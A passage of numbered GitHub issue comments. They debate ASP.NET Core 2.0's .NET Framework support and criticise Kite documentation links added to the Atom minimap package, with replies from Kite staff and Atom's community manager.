So previously max performance is what's most important above all else and now the recommendation is to refactor working systems to introduce more network hops? Microservice architectures isn't fairy dust technology that can magically make all Systems in all use-case better, @NickCraver already covers why it doesn't make sense for StackOverflow, it [doesn't make sense for Basecamp](https://m.signalvnoise.com/the-majestic-monolith-29166d022228) and many other prominent industry leaders also suggest going [monolith first](https://martinfowler.com/bliki/MonolithFirst.html) or that you can get [more benefits with less trade-offs by modularizing your system](http://blog.cleancoder.com/uncle-bob/2014/09/19/MicroServicesAndJars.html). In makes more sense in greenfield projects as in most cases refactoring and rewriting working systems is a cardinal sin that's a poor use of resources that doesn't offer any Customer value.

> @mythz I'm pretty sure what I was suggesting people should do was exactly what you said they should do.

It's not and you know it.
"
1020	"FYI .NET Standard 2.0 and .NET Core 2.0 was addressed live on https://channel9.msdn.com - starting at **11:54:00**. There's also a [direct link to the video](https://channel9.msdn.com/Events/Build/2017/C9L18).

Looks like all concerns have been officially alleviated:

Scott Hunter:

> The plan is that we'll have ASP.NET Core 2.0 working on .NET Framework in preview 2

> Github is not authoritative of what .NET is, the blogs (.NET blog or ASP.NET blog) are where the team will actually send a message to what we're doing with the tool, where we're going to move the tool and so on.

> WinForms, WPF those are Windows features, .NET Core is meant to be a cross platform flavor of .NET and so we're not going to move Windows-only-isms into  .NET Core... What I like to tell Customers .NET Framework is not going anywhere, we're going to support .NET Framework forever and so you should not feel compelled that you have to take all your old code and move it to .NET Core. The reasons to move to .NET Core are because you want cross-platform or you want to be fully side-by-side

> .NET Core can move faster than .NET Framework because it's not a piece of Windows and it doesn't support side-by-side so the goal is not to say that everyone has to move their App completely off .NET Framework to .NET Core, if you're running WinForms or WPF or WCF those are great workloads to run on .NET Framework and we're going to support those things forever. Don't feel that you have to move, you should move because you want cross-platform or you want the full side-by-side.
"
1021	"They just answered this on the Channel 9 stream above:

* ASP.NET Core 2.0 can both consume netstandard2.0 assemblies and run on any netstandard2.0-compliant platform.
* ASP.NET Core 2.0 can run on the .NET Framework.

That sounds pretty definite, in spite of the above statements by other MS devs in this thread."
1022	"Great discussions everyone.

My 2 cents here is that ASP.NET Core is the biggest LIBRARY from Microsoft which promotes the use of .NET Core among developers.

Since they made a huge deal of creating .NET Standard to support compatibility, and usage of libraries throughout different flavors of .NET, they should just target NETSTANDARD2.0 in asp.net core so we can just use it everywhere, how cool is it to use it inside Xamarin app or WPF app to support embedded web server scenarios. That's why ASP.NET Core is so decoupled from the ground up (like hosting, servers etc) ..

The picture they are looking is that since .NET Core can run everywhere, there is no need to support other flavors of .NET, and just move on with the new rapidly changing stuff to support ASP.NET Core's future demanding API requirements and tie ASP.NET Core with .NET Core.

I don't know exactly what super advanced API they want in .NET Core to keep growing ASP.NET Core, but probably that's another story. The point is that, ASP.NET Core is just another LIBRARY and it must stay that way.

Full .NET Framework is still the mature one, battle tested. Lots of enterprise customers are using it (including myself) and wants to keep using ASP.NET Core on .NET Framework.

Thanks"
1023	"> FYI .NET Standard 2.0 and .NET Core 2.0 was addressed live on https://channel9.msdn.com ...  Looks like all concerns have been officially alleviated

Knowing that the politics inside MS are generally brutal I guess the rather dubious revisionism in the video is an effort to avoid publicly throwing the earlier contributors to this thread under the bus.  I am never inclined to applaud corporate dishonesty but perhaps in this case it actually is for the greater good.  

To borrow an earlier meme, ""Onward, Oceania!"""
1024	"@markrendle 
>And if the worst case scenario is that you really are stuck on full fat Windows ASP.NET and IIS, that's far from the worst thing that could happen. You're still going to get all the cool C# stuff that's coming, and these things that go into .NET Core will get to you eventually, it'll just take a bit longer.<

That's really one of the main points of this thread. Most of us would be quite satisfied if asp.net core can run on the .net framework even if it takes a six months to a year to catch up. But the impression that I have got is that the asp team want to completely separate and never come back to being able to run on .net  framework.  It is the lack of clarity on future plans that make it very difficult for those of us who are responsible to our clients for building long-term development and management plans."
1025	"@mythz Yes it was.

> The best path forward is to accept whatever plan the ASP.NET team has in store for us and do our own bit to help move the platform forward"
1026	"@stefanolson You misunderstood me, I obviously wasn't clear enough. If for whatever reason ASP.NET Core running on .NET Core never gets to the point where it can run your code (e.g. the C++/CLI thing) and you can't rewrite your code or refactor your architecture, then stay on Classic ASP.NET MVC/WebAPI or WebForms.

(Incidentally, I notice we all finally moved on from the WebForms kerfuffle. Those guys are just getting on with it.)"
1027	@markrendle that's obviously not what was being referred to
1028	@markrendle WebForms to MVC  was a completely different kettle of fish. All it was doing was changing the UI layer.  I could still use the same backend code  to do my document generation et cetera. So I had no problems with that at all. What is being discussed here is completely breaking compatibility  with all of my code not just my UI code.. In actual fact the UI code is probably the most portable piece of it.
1029	@stefanolson Maybe for you and your code the transition from WebForms to MVC was easy, but for a lot of people it was as insurmountable as full .NET to Core is now. And my point still stands: if you can't migrate your code to ASP.NET Core, then don't.
1030	"@stefanolson @markrendle in the middle of a WebForms -> MVC5 transition right now, this was insurmountable to MVC/MVC2, less so in MVC5. We may be in a similar situation in that ASP .NET Core 3 or beyond may be an easier transition.

However, anyone who drank the WebForms coolaid HARD basically got screwed during the transition. We were saved because we didn't go HARD down the ViewState quagmire. I think what'll be important for the Framework -> Core transition is having a **reliable, clear, documented** plan for transition. 

The uncertainty that has arisen around this is the problem, if it's a clear distinction that for the foreseeable future code written to the .NET Standard will be portable and not a wasted effort will help older projects begin the transition process by writing new code in .NET Standard and moving libraries to it.

If that goal is subject to change that's not great, and it means anything you do could be a nail in your project's coffin, or you'll get stuck on ~Python 2.x~ .NET Framework 4.x for a long time."
1031	"Like any change in paradigm, people not using the right paradigm are going
to have a hard time.

I've warned so many people to not use HttpContext.Current... yet... it's
still being written today. Those apps are going to be hard to migrate since
they'll have tons of code depending on context values.

We had the same issue with the WebForms coolaid. Events, UpdatePanels,
etc... you could still use ASMX to do AJAX with jQuery. It was harder but
it was the ""right"" way to do it. Swapping from these kinds of apps were
easier when MVC came along.

The same thing is happening right now. The pattern is changing and what is
considered ""good practice"" has also evolved. All the code written in the
old way (against the grain) will have to be re-thought completely before
moving forward.

I don't think there's an easy transition plan other than knowing what is
""against the grain"" and how to fix it. I'm not including non-ported APIs in
there of course. That's another issue altogether.

On Fri, May 12, 2017 at 3:29 PM Aren Blondahl <notifications@github.com>
wrote:

> @stefanolson <https://github.com/stefanolson> @markrendle
> <https://github.com/markrendle> in the middle of a WebForms -> MVC5
> transition right now, this was insurmountable to MVC/MVC2, less so in MVC5.
> We may be in a similar situation in that ASP .NET Core 3 or beyond may be
> an easier transition.
>
> However, anyone who drank the WebForms coolaid HARD basically got screwed
> during the transition. We were saved because we didn't go HARD down the
> ViewState quagmire. I think what'll be important for the Framework -> Core
> transition is having a *reliable, clear, documented* plan for transition.
>
> The uncertainty that has arisen around this is the problem, if it's a
> clear distinction that for the foreseeable future code written to the .NET
> Standard will be portable and not a wasted effort will help older projects
> begin the transition process by writing new code in .NET Standard and
> moving libraries to it.
>
> If that goal is subject to change that's not great, and it means anything
> you do could be a nail in your project's coffin, or you'll get stuck on Python
> 2.x .NET Framework 4.x for a long time.
>
> —
> You are receiving this because you were mentioned.
> Reply to this email directly, view it on GitHub
> <https://github.com/aspnet/Home/issues/2022#issuecomment-301165679>, or mute
> the thread
> <https://github.com/notifications/unsubscribe-auth/AAMx6CoEdzs_Ys5a8W7Ri7lwfBqcIGUdks5r5LMIgaJpZM4NReOn>
> .
>
"
1032	"Wow, what a roller coaster journey this thread has been.

1. I'm relieved that microsoft is listening to the .net community on github
2. I'm amazed & delighted that this discussion, while passionate, has been almost completely professional
3. I think I finally grok what .net standard is supposed to mean (!!)"
1033	"Edit: removed rant about stuff that actually isn't an issue.  Finally read to the end of the post - video cleared up all worries.
"
1034	"@poter134 Ehh. Did you read the thread? OK, I get it; it's long, but still... Everything's been resolved. It was a mishap. Next preview (and the final version) of ASP.NET Core will support .NET Standard, which again means .NET Framework.

@PinpointTownes Maybe you should close the issue and add a notice (at the top) that there's been a conclusion?"
1035	I'd even suggest locking & limiting to collaborators. I think **everything** has been said.
1036	Apologies - Just got down to the video! that's a relief. Perhaps a summary at the top would be best for people like me that read 75% and despaired.
1037	Maybe link out to the Build video where they refer to this issue and clarify https://channel9.msdn.com/Events/Build/2017/C9L18 
1038	"> @PinpointTownes Maybe you should close the issue and add a notice (at the top) that there's been a conclusion?

Done :+1: "
1039	@PinpointTownes , we the community should also clean our communication on our side, and that is not easy. The rate at which issues, comments and so on are posted on GitHub is so high that it is hard for a smaller aspnet team to handle and keep track of everything. This asymmetry in number between us and the people behind .net core is well represented in the asp.net community standup, which is an almost exclusively unidirectional flow from them to us. Perhaps we could think of an inclusion of an extra layer between some community members and the .Net team where suggestions etc would be forwarded on skype meetings or standups. That would be hard to implement I assume but perhaps a direction to consider because the community is quite big. 
1040	"@ponant: that's the equivalent of what we had before, namely you report to some person and hope that person will pass it along. No, the community should be able to post their issues as-is and the team can then pick the ones they want to proceed with. If that is a lot of work, they (and not the community) should make sure they can handle it, e.g. by looking into using better tools than github issues (as it's not ideal: the set of questions how things work or why things don't work is mixed with the set of bug reports), add a layer for themselves which weed out the questions vs. the issues they have to work on. IMHO that's the most transparent as the community can see which issues are picked up and give feedback on other people's issues as well. If it is passed to a black box we have no control over it's IMHO a big step backwards. 

"
1041	Don't forget, you can also make PRs, contributions and bug fixes. Clearly know where to find the repos now 😉 
1042	@FransBouma , I agree with you as for transparency and I admit that adding a layer is generally a bad idea. But we need to understand the team if they get overwhelmed with info from the outside because we cannot dump info into GitHub and then complain if they take different directions. A better tool than GitHub would be welcomed and which would work in conjunction with it and more modern than the user voice.
1043	"Why did you MS guys never learn the lessons? A break-everything-update will be killing the .NET Core's reputation and market, just like what happen in WP 7.x to 8.

The migration from ASP.NET 4 to ASP.NET Core is a hard and long-term painful progress, please do not make it even harder."
1044	"> they buy the MSDN licenses, the big Azure enterprise agreements, the giant Office subscriptions, and the large SQL Server deployments that fund the creation, development, and maintenance of these tools to begin with

So this is like the first-class passengers blocking improvements from being made in economy. OK."
1045	FYI: Some info on 2.0.0-preview2 and .NET Framework; https://github.com/aspnet/Announcements/issues/243
1046	@chadwackerman I don't think they get to spend the whole two billion dollars on developing .NET, actually. Some of it probably goes on stupid-but-essential stuff like toilet paper, caffeinated beverages and Azure data-centers.
1047	"@oldrev 

> Why did you MS guys never learn the lessons? A break-everything-update will be killing the .NET Core's reputation and market, just like what happen in WP 7.x to 8.

Maybe they did. Otherwise there would have been even more breaking changes.

> The migration from ASP.NET 4 to ASP.NET Core is a hard and long-term painful progress, please do not make it even harder.

I totally agree the progress is hard, painful and going to take a while and I'm sure the MS folks are aware of that as well (whether they will make the progress easier is a different story)

Stepping back a little bit, my team did evaluate the possibility of switching from ASP.net to something else other than ASP.NET core but the decision is a no-brainer as we've so many dependencies on MS tech. At the end of the day, we've to accept the reality.

"
1048	"MS trying to repeat their own mistake and to drop support for the full .NET in `Microsoft.Data.Sqlite` repository https://github.com/aspnet/Microsoft.Data.Sqlite/pull/370

Without any discussions with the community and without any announces."
1049	@alexvaluyskiy Not sure what you're on about. They're replacing `net451` with `netstandard2.0`, so they're not dropping .NET support. `netstandard2.0` is supported by .NET 4.6.1.
1050	"@MartinJohns every change of TFS is a big breaking change, and I think it should be announced and discussed first.
`.NET 4.5.2` is still supported by MS, and `Microsoft.Data.Sqlite` could be run on top of it. Why MS drops the support of it and forces users to update to `net4.6.1` or `netstandard2.0`?"
1051	Because it's a reasonable expectation that you update your .NET version. This reduces maintenance cost, as they only have to support .NET Standard 2.0, and not multiple target runtimes. It's not that they're dropping .NET - they're still supporting it, but just a more recent version.
1052	"Are you implying microsoft has to support all packages down to .NET 1.0?

Stuff has to converge to netstandard at some version"
1053	"@irwiss That comment is not really helpful. Nowhere did he imply that packages should be supported down to .NET 1.0. But he did mention ""is still supported"", which is right. .NET 4.5.2 is still an officially supported version as of 3rd May 2017 with no scheduled end of lifetime (https://support.microsoft.com/en-us/help/17455/lifecycle-faq-net-framework).

Supporting supported .NET versions is not a far fetched request."
1054	@MartinJohns Neither party is being terribly helpful to be honest - the initial link to the sqlite issue was based on a false premise, and trying to reshape the hole (into what would be a trivial 4.5.2 vs 4.6.1 debate) with a bit of extra digging wasn't a good idea.
1055	"I really don't know what is happening. Why do have many dotnet this and that. This is really crazy. How do we have keep tracks of this?

No proper documentation on migration from one to another.
"
1056	First we had DLL-hell, and we now have Package-hell...the more things change.... ;)
1057	Any way to lock this thread? This looks like it belongs in a chat format rather than a GitHub issue.
1058	"@MaximRouiller If only you know the hell I have been through since yesterday just to upgrade from netcoreapp1.1 to netcoreapp2.0.

If you know a link that can make it easier for me, please refer me to it.

Thanks"
1059	"@smithaitufe 

https://weblog.west-wind.com/posts/2017/May/15/Upgrading-to-NET-Core-20-Preview"
1060	@smithaitufe That's kinda offtopic to this issue. Open a new issue instead.
1061	"@PinpointTownes @Eilon 

Any way to lock this thread? Everyone that comment something sends 100+ emails to notify of new activities while they may belong in a new thread."
1062	"@MaximRouiller I have gone through that and it didn't help.

For example, did you read this in that blog?

*
Overall this framework update provides a relatively smooth upgrade path aside from a few breaking changes.

But one thing that is extremely frustrating is the proliferation of SDKs, Runtimes, Tools and all the different versions that they incorporate. Especially when those things end up not quite lining up because they are all in different stages of preview.
*
I decided to create a new project just because I could not get it to work. "
1063	@Rutix Thanks. I will figure a way out
1064	"Per some of the discussion here, and given that this issue is fixed for the upcoming Preview 2 release, I'm locking this issue. For any additional questions about ASP.NET Core changes or issues, please file a new issue in the appropriate repo. If you're unsure where to file, please log an issue in the Home repo and tag me (@Eilon) and I'll help you find the right place.

Thanks!"
1065	As I understand the function of this package, it should not even be in there at all.
1066	"Time for adblock for atom 🤦‍
```
kite-minimap-wrapper > div {
    display: none;
}
```"
1067	Even with the above css tweak this still leaves the minimap gutter behind.  Definitely needs a disable option.  Disabled the whole package for now.
1068	"""Toggle minimap"" command leaves the advertisement visible and any further toggling just duplicate the advertisement without showing the actual minimap :rage: 

I would not mind the promotion if it was implemented correctly (for example disabled by default and with customizable position and max size), but right now the behaviour is simply obnoxious :-1: "
1069	"And now the editor just freezed after I comitted code changes via commandline :rage: 

I do not have time nor patience to investigate whether the cause was this package, `minimap-git-diff`, or some other junk - I may revisit this package in the future, but right now I consider it broken and worth only uninstalling :fire: "
1070	"For now you can use this workaround:
`apm install minimap@4.27.1`

It's just insane that someone would consider it to be a good idea to shove adds in (almost) every atom user's face."
1071	After wasting time with this broken package I closed Atom and opened Sublime Text. If this advertisement is still here on Monday morning I'm uninstalling Atom. 
1072	This is not cool at all. Kind of crazy that anyone would think this is okay.
1073	"I see how this can be a useful feature for some. However, I do not want it. This feature should be an external plugin.

Additionally, this feature does not work with minimap-autohide, which is a real bug and reason enough to revert the change.

@abe33 Why does this feature live here instead of [kite/atom-pugin](https://github.com/kiteco/atom-plugin)?"
1074	"Looks like @abe33 made new release (4.28.1) with button which hides the docs.
https://github.com/atom-minimap/minimap/commit/a4dc07b3fd9c467aefb1dd5b62f085f67e5ae3e9

Click on button updates `config.cson`:
```
minimap:
    ...
    disablePythonDocLinks: true
    ....
```"
1075	"This is **still** opt-out instead of opt-in. Even if you opt-out, the package **still** generates links in the background, instead of completely disabling the ""feature"". And if you ever change your mind about ads and toggle `disablePythonDocLinks` in the settings file, you get a nice fat low-level error :-1: 

So yes, the package is **still** broken and not worthy being used."
1076	"Can I block package versions like I do in pip requirements files?
Like this `<=minimap@4.27.1`"
1077	"@krzysztof-sikorski ""This is still opt-out instead of opt-in.""

yup :(
I don't like ad systems
its back to 4.27.1"
1078	Definitely against company policy to upload code to external servers. This is the kind of BS that makes companies completely lock down the software developers can use. Very disappointed.
1079	Seems like the developer is ignoring our concerns. If there won't be any update on the situation in the near future someone should really think about forking the project and publish it on apm. I don't think many people are okay with the ads and everyone I know that uses Atom also uses minimap, so I guess there is a huge demand for a fork.
1080	This has given me a very negative opinion of Kite.
1081	"Hi, folks -- Juan from Kite here, thank you for the feedback, we appreciate it. 

Wanted to clarify a few things as well as provide updates on your feedback.

Clarification
* The minimap plugin does not upload your code to any third party services. Your code is analyzed locally by the plugin to generate static links to relevant documentation on Kite.
* If you disable the links by choosing to opt-out, we do not analyze or generate any links in the background.

Feedback
* We have decided to leave the feature as opt-out since many users have found it useful. However, we have added two easy ways to disable the links:
  1) the `x` in the corner of the links box 
  2) the settings for the minimap plugin.
* I believe we have addressed the bugs around disabling the links; please let us know if you still encounter them.
* We only show a maximum of 5 links. Thus there is a max size for the links box.
* Pressing the chevron now collapses the links."
1082	"Please tell us one single reason for this to be in the main minimap instead of a minimap plugin. I just don't get it.

Sample reasons may include:
It does need Internet connection, so it costs money.
It is not part of the map.
It is language dependent.

Or:
Being a plugin makes it less useful for those who liked it."
1083	"> If you disable the links by choosing to opt-out, we do not analyze or generate any links in the background.

I'm sorry, I got a different impression from reading commit a7147ec0e4f5bd516b34250545badeefe320d3b2. I re-checked it now and I see I was wrong (see the condition on https://github.com/atom-minimap/minimap/blob/master/lib/main.js#L397).

> The minimap plugin does not upload your code to any third party services. Your code is analyzed locally by the plugin to generate static links to relevant documentation on Kite.

Does not upload **yet.** With the way this advert was introduced we have no guarantee some tracking code will not be sneaked in in the future. In fact the links already contain `source=minimap` tracking parameter...

> many users have found it useful

How exactly did you determine that? Do you mean initial *""WTF is this?""* traffic to your website?"
1084	"> many users have found it useful

ad tricks 101"
1085	"Isn't the idea behind a modular editor like atom that you get a basic editor and you add packages until the editor does what you need. I like to have a minimap like in sublime, so I install the minimap. Maybe I like to try kite sometime, then I will search for a kite package, maybe also for a minimap-kite package if I wan't related stuff displayed in minimap. The atom-minimap github account itself harbors a lot of minimap-* packages. Shouldn't they be included in minimap itself according to the `many users have found it useful` logic? No, because the idea is that every user can and should decide for himself what he wants.

Now you come into the equation @jlozano. Kite is just mindlessly shoved into anyone's face. What do you imagine happens when every plugin dev just add stuffs related to corporate stuff from the company he works at or other projects of his. You can't possibly think this is a good idea. Maybe someday you get a competitor and people wan't to use their product instead of kite, their minimap would still display (or at least contain) kite related stuff.

Is your vision of atom as a platform that any package should just becomes an ad canvas? Or are you in any way special that you should advertise but not others? Should open software in general be a ad platform? It's a slippery slope."
1086	"Another thought:

> We only show a maximum of 5 links. Thus there is a max size for the links box.

If I was ever interested in automatically generated documentation links, I would like to freely browse **all** of them instead of getting just an arbitrarily chosen sample. It should be a completely independent widget and not a ""box"" shoved inside minimap area and consuming its vertical space.

In other words, this ""feature"" does not work well *even* for its intended target :-1: "
1087	"Here's a patch I've verified against current branch that undoes the damage of [16c11d8](https://github.com/atom-minimap/minimap/commit/16c11d82b889ce1260342e4fa7d6d1905c0fde45)

[remove-kite.patch.txt](https://github.com/atom-minimap/minimap/files/978471/remove-kite.patch.txt)
"
1088	"Minimap was the first Atom package I ever installed, and it has been with me continuously since 2014. But when I saw this, I clicked the ""Uninstall"" button without a second's hesitation.

It's obvious to any reasonable person that those ads, even if taken to be useful, have nothing to do with this package's functionality (documentation links vs. code navigation). The implementation is buggy (see recently filed issues), ugly (hardcoded module names), and works only for a single programming language. Predictably, the backlash (this issue) has been swift and substantial.

Still, a week passed without any response from the developer. Then comes @jlozano and adds insult to injury:

> We have decided to leave the feature as opt-out since many users have found it useful.

I don't believe that. Have you even read this issue thread?!? Advertising is *not* a feature, and *if* such functionality (automatic documentation links) were desired, it would be links to Stack Overflow, Read the Docs, or some other established and trusted resource, not to a little-known startup product that is barely out of beta (no offense intended).

But hey – your roof, your rule. I have contributed not a single line of code to Minimap, and would never presume to tell the author what he can or cannot do with his own project. But for the love of all that is holy, stop trying to spin this as a ""feature"" that people want. It's not a feature, it's advertising – and people don't want it, *you* want it. The least you can do is own up to that.

Going forward, if this very bad example from the number one Atom package starts getting imitated by other package authors, the entire package ecosystem – and, by extension, the Atom editor itself – could be at risk. The only way to ensure this doesn't happen seems to be clear rules from the Atom team about what a package is and is not allowed to do if it wants to be listed in the official database. Should Atom become known as the only mainstream editor with ""sponsored"" packages? I hope not...

"
1089	I've disabled minimap for now. Anyone planning to fork and remove the kite ads?
1090	@djczaski I accidentally found one such fork on Github, but it looks more like a temporary workaround than a long-term investment.
1091	":wave: For those that don't know me, I'm the Community Manager for Atom. I've also been a user of the minimap package since its inception and I've been watching the comments on this issue since it was opened. Since it seems some are expecting some sort of response from the Atom team about this, I'll comment.

First, as a developer, I agree that the functionality described here makes more sense as a plugin for minimap than built in to the base package.

As a steward of the Atom editor and the Atom package ecosystem, I'm of course concerned about packages being used for nefarious purposes. But I'm also loathe to impose blanket rules on what is or isn't valid functionality for packages without some very well-thought-out rationalization and justification for those rules. I've been watching this topic hoping that the smart people here would give me some ideas :wink: Most of what I have seen so far has been:

1. The functionality is undesirable
1. The functionality is unnecessary
1. The functionality is buggy
1. The functionality is better implemented in a different way
1. Slippery slope arguments about advertisements killing Atom

I hope we can all agree that items 1 through 4 aren't valid reasons for keeping things out of the Atom package registry. We also all agree that Atom containing advertisements is undesirable.

So what constitutes an advertisement? I consider this an advertisement:

<img width=""740"" alt=""screen shot 2017-05-10 at 12 42 58 pm"" src=""https://cloud.githubusercontent.com/assets/1038121/25918011/c3d94da0-357e-11e7-9038-6a61cc8248d1.png"">

Its sole purpose is to get you to come buy something and, other than informing you of a jewelry business, has no useful benefit to the viewer. But the Kite functionality doesn't seem to have a _sole_ purpose of getting one to buy something and does seem to provide benefit to some potential viewers even if it doesn't provide any benefit to others.[1]

So what if someone created a package that showed the latest [Wall Street Journal](https://www.wsj.com/) headlines as links to the stories? The Wall Street Journal is a for-pay service and a lot of their content is behind paywalls. But I can see someone feeling that package would be very useful for them, especially if they already had a subscription. According to the logic I see being employed by the more vehement comments here, those links would be considered ""advertisements"" despite how very useful they might be to some. I have a hard time agreeing with that logic.

Now, with that said:

* I agree that some people find the Kite functionality not useful to them
* I completely understand if people want to uninstall minimap
* I strongly advocate for people who think that this is a problematic direction to fork the package and provide an alternative to the community (open source rules :metal:)

I'm definitely keeping my eye on this kind of thing and if advertisements become a problem, I'm sure that the Atom team will consider specific rules. I just don't think we're there yet.

[1] If providing benefit to some but not to others was a reason to not include functionality, pretty much every feature in Atom would have to be removed! I _think_ we might still be able to have a box where you could type stuff ... maybe save the file :laughing:"
1092	"What makes this an advertisement is not the content, but the context in which the content appears. If it was in a separate package, the links would be appropriate for the purpose of that package, and users who choose to install it would be getting what they expected.

In my view what's happened here is a transparent move to leverage the popularity of this package to promote an unrelated service.

This may be the first time it's happened in the atom package ecosystem but it's not a new phenomenon in general. If you look at web browser extensions, popular extensions often get sold off to another party who then adds ad-injection or other user-hostile code in an attempt at monetization. Browser vendors have been removing extensions that do this from their extension stores for years now.

So what's the difference between the atom-minimap kite promotion and, say, a Gmail checker browser extension getting an update that starts turning random words on all the pages you view into ad links?

Demographic specificity?"
1093	"Hi all,

Thank you for the input, product feedback and suggestions, we appreciate it.

Wanted to add some clarification on some points that were made:
1) The minimap plugin does not, and will *never* upload your code to any third party services.
2) We decided to hard code the module names to avoid making requests to our servers.

Kite's mission is to provide tools that make developers more productive, and we thought that providing links to documentation might be helpful to some users. We are sorry to hear that people on this thread have not found it useful. However, we plan to iterate on the feature to make it more valuable and will address any bugs that arise as quickly as possible. If we thought that this feature provided no value to users, we would not have gone in this direction. We hope to continue to work with you all to improve the feature going forward."
1094	"Ads are getting smarter...
If this feature is appreciated by a lot of people then why not put it in a separate package ? People who want it would install it. The problem is not that the feature is useless, it's that it's included in a package used to display a minimap of your code and it is a very different feature. Seriously, you would not expect your linter to provide a chat feature, it has no sense.
I can understand the point of this feature but not the fact that it's included in the minimap package. If you guys cannot understand this then I hope someone will fork minimap and keep it focused to its point. "
1095	"Why is the kite functionality implemented directly in minimap? There's one reason -- promote the author's $tartup. It's right there in the commit message. It doesn't say anything about adding features to make developers more productive. It's simply to promote.

This could have been `minimap-kite` and nobody would have complained. This is a slippery slope indeed. I'm surprised others haven't done this already."
1096	"@jlozano Seriously, at this point, do you still think that keeping this is the best course of action ? There is not a single comment on this issue supporting the addition (except yours). It seems to me that the only thing you will achieve if you persist is to alienate both minimap users and potential kite users. I am myself very enthusiastic about Kite, but this move is seriously making me reconsider.

Look, it is fair play : you tried it, it angers people and that might harm your startup and this community. Why wouldn't you just admit you made a mistake, remove this and make a minimap add-on out of it ? Obstination and denial will win you nothing here."
1097	"Note that this kite integration seem to be causing issue #597 (the exception in question originates in `kite-wrapper.js`).

Also note that a similar sudden kite invasion was done in e.g. `autocomplete-python` package, and people aren't happy there either (autocomplete-python/autocomplete-python#285, autocomplete-python/autocomplete-python#299). This appears to be a marketing strategy by kite developers."
1098	Huh. Starting to search any package where @abe33 is committer. Going to disable them all or even migrate to sublime.
1099	"I think the most urgent atom feature for me now is plugin sandboxing and access system. Like ""This plugin requires: access to web, writing access to filesystem, sounds, do you agree?"". But I doubt it can be done easily."
1100	The transition of autocomplete-python is a bit odd, please see https://github.com/autocomplete-python/autocomplete-python/issues/308.
1101	"@neumond There is no need for a sandbox. We should just collectively fight against these kind of practices before such thing becomes normal.

@lee-dohm As far as I can tell minimap is really popular and even a default feature of sublime. Would it be possible to integrate a fork without ads to the atom core addons?

I think the best course of action is to not give them any ground to establish this shady stuff in our favorite editor. The way @jlozano does not address any of our concerns and just feeds us shallow cookie cutter responses says a lot about kite. The idea of their service seems interesting but does anyone really want to submit your code to a company that has such a low respect for users and participates in those shady guerrilla advertisement in open source software?"
1102	@erikgeiser Taking on support of such a complex package isn't something that we have the bandwidth for right now. We would need people from the community to step up and handle that.
1103	"@lee-dohm: Glad to see this issue has the attention of the Atom team!

I don't think the definition of ""advertisement"" is anywhere near as blurry as you suggest above. Links to *Wall Street Journal* articles in a news reader app are part of the app's functionality, links to *Wall Street Journal* articles in a mobile game are advertisements. What we have here are links to a code documentation service in a code navigation package. The two are clearly unrelated, and the links were even identified as a ""promotion"" in [the original commit message](https://github.com/atom-minimap/minimap/commit/16c11d82b889ce1260342e4fa7d6d1905c0fde45).

The *autocomplete-python* issues mentioned by @magv give rise to more concern, because they show that this practice is already starting to spread as feared (and not limited to displaying links in this case!). Note that although the Kite functionality is integrated in *autocomplete-python*, ***Kite isn't mentioned anywhere in [the project's README](https://github.com/autocomplete-python/autocomplete-python/blob/master/README.md).*** This is crossing the line into ""deception"" territory.

Regarding Atom package rules, how about this simple one for starters:

> Packages must clearly state in their README what, if any, web services they communicate with, and what data they upload to these services.

In the long term, this rule should of course be technologically enforced, i.e. package internet access restricted and managed by Atom, but this issue seems too urgent to wait for such a solution to become available.
"
1104	"> Regarding Atom package rules, how about this simple one for starters:
> > Packages must clearly state in their README what, if any, web services they communicate with, and what data they upload to these services.

This is a much better suggestion and leaves out the hyperbolic ""advertisement"" statements.

I wasn't aware of the autocomplete-python events. Now that I am, I agree that this is a problematic pattern and have already planned to bring it up to the team on Monday.
"
1105	"Hi guys, just wanted to say that although we originally updated the autocomplete-python [plugin description](https://github.com/autocomplete-python/autocomplete-python/blob/master/package.json#L5), we failed to update the README.md as pointed out above.  I just addressed that.  Please feel free to submit a PR for the README.md if there's more information you think we should include, or leave a note here.

A couple of other quick notes:

* Apologies for not updating the README.md.  That slipped through the cracks!
* We focused most of our disclosure efforts on the autocomplete-python install experience.  We were focused on that and worked pretty hard to make sure there's a lot of communication around the choice tradeoffs during the install flow.  (three screens total)"
1106	@krzysztof-sikorski I agree and think the feature's utility can be improved.  This was a simple v1.  I like the ideas for making it better.
1107	">  This was a simple v1. I like the ideas for making it better.

@adamsmith, will a separate minimap-kite package be considered?"
1108	Since the same thing also happened to `autocomplete-python`, it provoked me to migrate to VSCode. Such cases.
1109	"So I disabled minimap a few weeks ago when I first saw this issue, but I didn't uninstall it. I won't feign indignation about it but I certainly don't want this feature in the core atom-minimap/minimap module.   Based on the strong reaction from the user community I imagined that this was a misguided decision that would be reverted soon and I'd just re-enable minimap then. 

I happened to be cleaning up my atom config today and was reminded to come check on this issue and see if had been resolved.

I'm a little surprised that here we are nearly a month later and there's been no real motion on this in any direction.

**What's happening with this?**

@abe33 et al, I get that this is your repo, so feel free to roll-back or double-down on the Kite integration, but what does it mean that this issue is still open?  Should we expect additional changes to the Kite integration (beyond the opt-out and README updates) that address some of the concerns raised by many on this thread?  Or have you resolved that the Kite integration will definitely remain a part of the minimap core?

If the latter, maybe you should close this issue (since technically @pyvim's original request has been addressed) or tag it as WONTFIX or something.

**I guess what I'm looking for is some kind of statement from the committers as to whether you've decided to keep the Kite integration in the minimap core, or if you intend to split it into a minimap-kite as many have suggested, or if you're somehow still trying to figure that out.**
"
1110	"As an aside to @adamsmith @jlozano or others related to the Kite side of this - for what it's worth, I'm certainly a _potential_ customer of a service like Kite, and to be frank I happen to be in a position to influence and/or make the ""buying decision"" for services like Kite for a moderately large number of others, so I imagine I'm pretty squarely in your target market.   Based on this thread (and a quick scan of a similar thread over at autocomplete-python), I think maybe you're not understanding how outsiders are experiencing this. Here's some feedback on the impact of this ""promotion"" on me personally:

 1. I'd never heard of Kite before, but like others have suggested the way in which this integration was rolled out, and the relative lack of response to concerns from the user community as seen here, left me with a pretty negative impression of Kite.

 2. Having spent a little time experimenting with the ""kite promotion"" as currently implemented in minimap today, it actually looks like a pretty neat service.  Had I first encountered Kite as part of a stand-alone atom-kite or even minimap-kite module, I think I would have had a pretty positive impression of the service.  (Even though it's pretty much shoe-horned into minimap: There's no particular reason to associate documentation-lookups with a 30,000-foot, scanning-and-navigation-oriented view of the code.)

 3. If you were to respond to the feedback from the user community and split this functionality out into an independent module, it would go a long way toward repairing my impression of Kite.

Point #3 may sound like I'm trying to butter you up so you'll do what I want (for that matter this next line may sound like a threat) but to be honest I don't care all that much either way. I assume that if this feature remains as it currently stands (even in opt-out mode) someone will just fork minimap core to remove it and I'll just use that version instead.  (For the time being I've just commented out the associated code in my local copy, it certainly isn't hard to do.)  

